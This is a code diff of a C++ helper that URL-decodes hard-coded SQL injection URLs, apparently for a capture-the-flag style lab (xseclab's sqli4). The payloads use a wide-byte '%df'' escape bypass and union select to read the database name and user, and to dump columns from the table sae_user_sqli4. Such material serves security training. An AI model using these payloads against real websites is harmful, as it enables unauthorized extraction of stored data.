@@ -22,30 +22,26 @@ using namespace std;
 
 int main() {
     string temp;
-    string s = "http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%df'%20union%20select%204,database%28%29,user%28%29%23";
+    vector<string> symbol_0 = {"%df", "'", " ", "(", ")", "#"};
+    vector<string> symbol_1 = {"%df", "%27", "%20", "%28", "%29", "%23"};
+    string s = "http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%df%27%20union%20select%201,group_concat%28title_1%29,group_concat%28content_1%29%20from%20sae_user_sqli4%23";
+
+    bool flag = true;
     unsigned index = 0;
     while(index < s.size()) {
-        switch(s[index]) {
-            case '%': {
-                if(s[index + 1] == '2' && s[index + 2] == '0') {
-                    temp += ' ';
-                }
-                else if(s[index + 1] == '2' && s[index + 2] == '8') {
-                    temp += '(';
-                }
-                else if(s[index + 1] == '2' && s[index + 2] == '9') {
-                    temp += ')';
-                }
-                else if(s[index + 1] == '2' && s[index + 2] == '3') {
-                    temp += '#';
-                }
+        string sub_string = s.substr(index, 3);
+        for(unsigned i = 0; i < symbol_1.size(); ++i) {
+            if(symbol_1[i] == sub_string) {
+                temp += symbol_0[i];
                 index += 3;
-            }; break;
-            default: {
-                temp += s[index];
-                ++index;
-            }; break;
+                flag = false;
+            }
         }
+        if(flag) {
+            temp += s[index];
+            ++index;
+        }
+        flag = true;
     }
     cout << temp << endl;
     return 0;
